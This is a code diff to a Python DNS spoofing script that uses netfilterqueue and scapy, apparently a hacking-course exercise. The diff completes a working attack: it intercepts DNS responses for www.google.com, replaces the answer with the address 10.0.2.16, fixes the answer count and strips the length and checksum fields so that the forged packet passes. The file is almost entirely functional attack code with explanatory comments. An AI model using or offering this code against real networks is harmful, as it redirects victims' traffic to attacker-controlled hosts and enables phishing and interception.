@@ -21,13 +21,23 @@ import netfilterqueue
 import scapy.all as scapy
 
 def processPacket(packet):
-    scapyPacket = scapy.IP(packet.get_payload())
-    if scapyPacket.haslayer(scapy.DNSRR):
-        qname = scapyPacket[scapy.DNSQR].qname
-        if "www.google.com" in qname:
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if b"www.google.com" in qname:
             print("[+] spoofing")
             answere = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
+            scapy_packet[scapy.DNS].an = answere
+            scapy_packet[scapy.DNS].ancount = 1   #we got this ancount from DNS response packet which specifies how many records are sent back and we need to modify it also to correspond with our one single response
             
+            #deleting fields that tell that packet has been modified, scapy will recalculate them for us
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+            
+            #set payload we created
+            packet.set_payload(bytes(scapy_packet))
     #print the raw pyaload
     #print(packet.get_payload())
     
